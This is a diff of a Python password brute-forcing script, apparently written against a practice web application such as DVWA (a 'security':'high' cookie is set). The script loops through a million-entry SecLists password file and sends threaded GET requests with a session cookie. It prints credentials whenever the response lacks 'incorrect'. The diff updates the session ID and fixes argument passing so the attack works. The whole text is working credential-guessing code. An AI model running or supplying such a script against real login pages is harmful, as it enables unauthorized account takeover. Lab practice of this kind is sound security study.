@@ -3,7 +3,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 
 
-cookies = {'PHPSESSID' : 'e8c5334e536a83d5a5946d0cf9f16311', 'security' : 'high'}
+cookies = {'PHPSESSID' : 'b8545e3f04ed28532e3b9fec08132e04', 'security' : 'high'}
 
 
 
@@ -23,11 +23,12 @@ with open('1000000-password-seclists.txt','r') as password :
 	
 			
 			
-	def send_get_request(url):
+	def send_get_request(url, n, p):
 				
 		try: 
 			
 			response = requests.get(url, cookies=cookies)
+			
 			if ('incorrect' not in response.text):
 				print('username=' + n +',&password=' + p)
 					
@@ -48,7 +49,7 @@ with open('1000000-password-seclists.txt','r') as password :
 				
 				urls = url * num_requests
 					
-				executor.submit(send_get_request, url)
+				executor.submit(send_get_request, url, n, p)
 				
 				
 			
@@ -61,5 +62,3 @@ with open('1000000-password-seclists.txt','r') as password :
 			
 			#print(req.url)
 			
-		
-						
